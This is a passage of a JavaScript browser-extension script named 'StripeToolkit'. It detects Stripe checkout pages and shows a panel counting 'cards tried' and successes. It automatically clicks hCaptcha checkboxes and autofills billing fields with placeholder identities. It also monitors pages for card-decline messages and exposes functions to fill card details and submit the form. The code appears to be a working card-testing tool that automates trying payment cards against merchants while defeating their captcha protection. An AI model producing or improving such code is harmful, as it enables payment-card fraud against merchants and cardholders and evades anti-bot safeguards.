    
    function createToastContainer() {
        const container = document.createElement('div');
        container.id = 'stripe-toolkit-toasts';
        container.style.cssText = `
            position: fixed;
            top: 20px;
            right: 20px;
            z-index: 999999;
            display: flex;
            flex-direction: column;
            gap: 10px;
        `;
        
        const style = document.createElement('style');
        style.textContent = `
            .stp-toast { display: flex; align-items: flex-start; gap: 12px; padding: 12px 15px; border-radius: 8px; background: #1a1a2e; border: 1px solid rgba(99, 91, 255, 0.3); min-width: 280px; max-width: 350px; animation: slideIn 0.3s ease; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; }
            .stp-toast.success { border-left: 3px solid #22c55e; }
            .stp-toast.error { border-left: 3px solid #ef4444; }
            .stp-toast.info { border-left: 3px solid #3b82f6; }
            .stp-toast-icon { font-size: 16px; }
            .stp-toast.success .stp-toast-icon { color: #22c55e; }
            .stp-toast.error .stp-toast-icon { color: #ef4444; }
            .stp-toast.info .stp-toast-icon { color: #3b82f6; }
            .stp-toast-content { flex: 1; }
            .stp-toast-title { font-size: 11px; font-weight: 600; color: #9ca3af; margin-bottom: 2px; }
            .stp-toast-message { font-size: 13px; color: #e0e0e0; }
            .stp-toast-details { font-size: 11px; color: #6b7280; margin-top: 4px; font-family: monospace; }
            .stp-toast-close { background: none; border: none; color: #6b7280; cursor: pointer; font-size: 18px; padding: 0; line-height: 1; }
            @keyframes slideIn { from { transform: translateX(100%); opacity: 0; } to { transform: translateX(0); opacity: 1; } }
        `;
        document.head.appendChild(style);
        document.body.appendChild(container);
        return container;
    }
    
    function updatePanelStats(cardsTried, success) {
        const triedEl = document.getElementById('stp-cards-tried');
        const successEl = document.getElementById('stp-success');
        if (triedEl) triedEl.textContent = cardsTried;
        if (successEl) successEl.textContent = success;
    }

    function detectAndClickCaptcha() {
        // hCaptcha checkbox selectors
        const captchaSelectors = [
            'iframe[src*="hcaptcha.com"]',
            'iframe[title*="hCaptcha"]',
            '.h-captcha iframe',
            '#hcaptcha iframe',
            'iframe[data-hcaptcha-widget-id]'
        ];
        
        for (const selector of captchaSelectors) {
            const iframe = document.querySelector(selector);
            if (iframe) {
                try {
                    const iframeDoc = iframe.contentDocument || iframe.contentWindow?.document;
                    if (iframeDoc) {
                        const checkbox = iframeDoc.querySelector('#checkbox, .checkbox, [role="checkbox"]');
                        if (checkbox) {
                            log('Found hCaptcha checkbox, clicking...');
                            checkbox.click();
                            showToast('hCaptcha Detected', 'info', 'Auto-clicking checkbox...');
                            return true;
                        }
                    }
                } catch (e) {
                    // Cross-origin iframe, try clicking the iframe itself
                    log('Cross-origin hCaptcha iframe, attempting click...');
                    iframe.click();
                }
            }
        }
        
        // Also check for hCaptcha challenge modal
        const challengeSelectors = [
            '.hcaptcha-box',
            '[data-hcaptcha-response]',
            '.h-captcha',
            '#hcaptcha'
        ];
        
        for (const selector of challengeSelectors) {
            const element = document.querySelector(selector);
            if (element) {
                const checkbox = element.querySelector('input[type="checkbox"], .checkbox');
                if (checkbox) {
                    log('Found hCaptcha element, clicking...');
                    checkbox.click();
                    return true;
                }
            }
        }
        
        return false;
    }
    
    function autoFillBillingDetails() {
        chrome.storage.local.get(['autofillData', 'email'], (data) => {
            const autofill = data.autofillData || {
                name: 'John Doe',
                country: 'US'
            };
            
            // Use email from settings if available
            const email = data.email || autofill.email || 'test@example.com';
            
            // Fill email
            const emailSelectors = ['input[type="email"]', 'input[name="email"]', 'input[autocomplete="email"]', 'input[placeholder*="email" i]'];
            for (const sel of emailSelectors) {
                const el = document.querySelector(sel);
                if (el && !el.value) {
                    simulateInput(el, email);
                    log('Auto-filled email:', email);
                    break;
                }
            }
            
            // Fill name
            const nameSelectors = ['input[name="cardholderName"]', 'input[name="name"]', 'input[autocomplete="cc-name"]', 'input[autocomplete="name"]'];
            for (const sel of nameSelectors) {
                const el = document.querySelector(sel);
                if (el && !el.value) {
                    simulateInput(el, autofill.name);
                    log('Auto-filled name:', autofill.name);
                    break;
                }
            }
            
            // Fill country/region
            const countrySelectors = ['select[name="country"]', 'select[autocomplete="country"]', 'input[name="country"]'];
            for (const sel of countrySelectors) {
                const el = document.querySelector(sel);
                if (el) {
                    if (el.tagName === 'SELECT') {
                        selectOption(el, autofill.country);
                    } else if (!el.value) {
                        simulateInput(el, autofill.country);
                    }
                    log('Auto-filled country:', autofill.country);
                    break;
                }
            }
        });
    }

    function onReady() {
        initializeModules();
        setupResponseMonitor();
        
        if (detectCheckoutPage()) {
            log('Checkout page detected!');
            const checkoutInfo = extractCheckoutInfo();
            createFloatingPanel();
            createDetectionBadge();
            showToast('Stripe Checkout Detected', 'info', new Date().toLocaleTimeString());
            notifyPopup('checkoutDetected', { 
                info: checkoutInfo,
                hasCardFields: cardFieldsDetected
            });
            
            // Save checkout log
            saveCheckoutLog(checkoutInfo);
            
            // Auto-fill billing details - always trigger
            setTimeout(() => {
                autoFillBillingDetails();
                log('Auto-fill triggered on checkout detection');
            }, 1500);
        }

        const observer = new MutationObserver((mutations) => {
            // Check for checkout page
            if (!cardFieldsDetected && detectCheckoutPage()) {
                log('Card fields appeared');
                createFloatingPanel();
                createDetectionBadge();
                notifyPopup('checkoutDetected', { 
                    info: extractCheckoutInfo(),
                    hasCardFields: cardFieldsDetected
                });
            }
            
            // Check for hCaptcha
            if (config.autoCaptchaClick) {
                for (const mutation of mutations) {
                    if (mutation.addedNodes.length > 0) {
                        const hasHcaptcha = document.querySelector('iframe[src*="hcaptcha"], .h-captcha, #hcaptcha');
                        if (hasHcaptcha) {
                            setTimeout(detectAndClickCaptcha, 500);
                            break;
                        }
                    }
                }
            }
            
            // Check for decline message on page
            const declineText = document.body.innerText;
            if (declineText.includes('Your card has been declined') || 
                declineText.includes('card_declined') ||
                declineText.includes('authentication_failure')) {
                log('Decline message detected on page');
            }
        });

        observer.observe(document.body, {
            childList: true,
            subtree: true,
            characterData: true
        });
        
        // Initial captcha check
        if (config.autoCaptchaClick) {
            setTimeout(detectAndClickCaptcha, 1000);
        }
    }

    init();

    window.StripeToolkit = {
        fillCard: fillCardDetails,
        submit: clickSubmit,
        getInfo: extractCheckoutInfo,
        findFields: findCardFields,
        isCheckout: () => isCheckoutPage
    };

})();
